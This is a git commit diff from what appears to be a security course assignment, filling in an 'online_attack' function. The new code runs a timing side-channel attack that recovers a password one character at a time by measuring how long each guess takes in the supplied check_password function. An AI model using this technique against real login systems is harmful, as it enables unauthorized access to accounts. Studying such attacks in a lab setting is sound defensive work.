eb03acef251884e836cc45a9d402f91fa2d8a8bd
Bill3710 <112989619+Bill3710@users.noreply.github.com>
2024-10-11 18:41:29 -0700

    41 start

--- A4/a4.py
+++ A4/a4.py
@@ -1,7 +1,31 @@
 from typing import Callable
+import time
 
 def online_attack(check_password: Callable) -> str:
     # TODO Implement attack here by calling check_password
     # Return the password
-    password = 'abcdef'
-    return password
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    
+    guessed_password = ""
+
+    while True:
+        maxTime = -1
+        current_char = None
+        for char in charset:
+            gues = guessed_password + char
+            start = time.time()
+            check_password(gues)
+            timeGues = time.time() - start
+            print("guess", timeGues)
+
+            if timeGues > maxTime:
+                maxTime = timeGues
+                current_char = char
+
+        if current_char is None:
+            raise ValueError("No valid character found; check timing logic.")
+        
+        guessed_password += current_char
+
+        if check_password(guessed_password):
+            return guessed_password
